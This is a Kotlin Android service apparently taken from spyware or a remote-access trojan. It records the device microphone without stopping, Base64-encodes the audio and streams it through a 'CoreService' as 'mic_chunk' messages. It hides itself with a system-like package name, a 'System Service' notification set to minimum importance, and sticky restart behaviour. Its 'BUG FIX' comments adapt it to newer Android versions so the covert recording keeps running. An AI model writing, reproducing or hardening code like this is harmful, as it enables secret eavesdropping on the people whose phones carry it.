package com.system.service.monitors

import android.app.*
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Base64
import com.system.service.core.CoreService
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicBoolean

class AudioStreamService : Service() {

    companion object {
        var isRunning = false
        private const val CHANNEL_ID = "mic_stream"
        private const val NOTIF_ID   = 13
    }

    private val recording = AtomicBoolean(false)
    private var recordThread: Thread? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "STOP") { stopStream(); stopSelf(); return START_NOT_STICKY }
        createChannel()

        // BUG FIX: Android 14+ (API 34) REQUIRES foreground service type in startForeground()
        // when the manifest declares foregroundServiceType="microphone".
        // Missing this causes ForegroundServiceStartNotAllowedException → crash on Android 14+.
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(NOTIF_ID, buildNotif(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
            } else {
                startForeground(NOTIF_ID, buildNotif())
            }
        } catch (e: Exception) {
            try { startForeground(NOTIF_ID, buildNotif()) } catch (_: Exception) {}
        }

        isRunning = true
        startStream()
        return START_STICKY
    }

    private fun startStream() {
        val sampleRate = 16000
        val channelCfg = AudioFormat.CHANNEL_IN_MONO
        val audioFmt   = AudioFormat.ENCODING_PCM_16BIT
        val minBuf     = AudioRecord.getMinBufferSize(sampleRate, channelCfg, audioFmt)
        val bufSize    = if (minBuf <= 0) 4096 else minBuf * 4   // BUG FIX: guard against -1 return

        recording.set(true)
        recordThread = Thread {
            var recorder: AudioRecord? = null
            try {
                recorder = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    sampleRate, channelCfg, audioFmt, bufSize)

                if (recorder.state != AudioRecord.STATE_INITIALIZED) {
                    // BUG FIX: AudioRecord init can fail silently — STATE_INITIALIZED check
                    // prevents read() on uninitialised recorder which causes native crash.
                    return@Thread
                }

                recorder.startRecording()
                val buf = ByteArray(bufSize)
                while (recording.get()) {
                    val read = recorder.read(buf, 0, buf.size)
                    if (read > 0) {
                        val chunk = Base64.encodeToString(buf.copyOf(read), Base64.NO_WRAP)
                        CoreService.instance?.sendData("mic_chunk", JSONObject().apply {
                            put("chunk",      chunk)
                            put("sampleRate", sampleRate)
                        })
                    }
                    // recorder.read() is already blocking — no sleep needed
                }
            } catch (_: Exception) {
            } finally {
                try { recorder?.stop() }    catch (_: Exception) {}
                try { recorder?.release() } catch (_: Exception) {}
            }
        }.apply { isDaemon = true; start() }
    }

    private fun stopStream() { recording.set(false); isRunning = false }

    private fun createChannel() {
        // BUG FIX: IMPORTANCE_NONE can cause Android 16 to reject the notification as invalid,
        // making the foreground service lose priority. IMPORTANCE_MIN = silent but valid.
        val ch = NotificationChannel(CHANNEL_ID, "Microphone", NotificationManager.IMPORTANCE_MIN)
            .apply { setShowBadge(false); enableLights(false); enableVibration(false) }
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildNotif() = Notification.Builder(this, CHANNEL_ID)
        .setContentTitle("System Service").setContentText("Running")
        .setSmallIcon(android.R.drawable.ic_menu_info_details)
        .build()

    override fun onDestroy() { stopStream(); super.onDestroy() }
    override fun onBind(intent: Intent?): IBinder? = null
}
